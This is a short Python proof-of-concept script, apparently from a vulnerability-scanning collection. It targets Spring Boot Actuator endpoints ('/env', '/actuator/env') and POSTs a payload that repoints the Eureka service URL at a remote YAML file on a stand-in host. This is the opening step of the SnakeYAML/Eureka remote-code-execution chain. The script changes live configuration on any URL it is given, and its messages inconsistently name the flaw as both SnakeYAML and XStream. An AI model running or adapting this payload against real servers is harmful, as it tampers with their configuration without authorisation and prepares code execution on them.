import requests
requests.packages.urllib3.disable_warnings()

'''


参考链接：

'''

def poc(url, useragent, proxies=None):
    header1 = {
        "User-Agent": useragent,
        "Content-Type": "application/x-www-form-urlencoded"
        }
    header2 = {
        "User-Agent": useragent,
        "Content-Type": "application/json"
        }
    payload_1 = "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
    payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"
    path1 = '/env'
    path2 = '/actuator/env'

    try:
        urltest1 = url + path1
        urltest2 = url + path2
        re1 = requests.post(url=urltest1, headers=header1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        re2 = requests.post(url=urltest2, headers=header2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        if ('127.0.0.2' in str(re1.text)):
            return f'[+] 2021 SnakeYAML-RCE exists. The link: --> {urltest1} Spring 1.x payload: {payload_1}'
        elif ('127.0.0.2' in str(re2.text)):
            return f'[+] 2021 SnakeYAML-RCE exists. The link: --> {urltest2} Spring 2.x payload: {payload_2}'
        else:
            return '[-] 2021 Eureka_Xstream-RCE not exists.'
    except Exception as e:
        return f'[-] An error occurred and it has been logged: {e}'

if __name__ == '__main__':
    print(poc(input('请输入目标url:').strip('/'), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'))
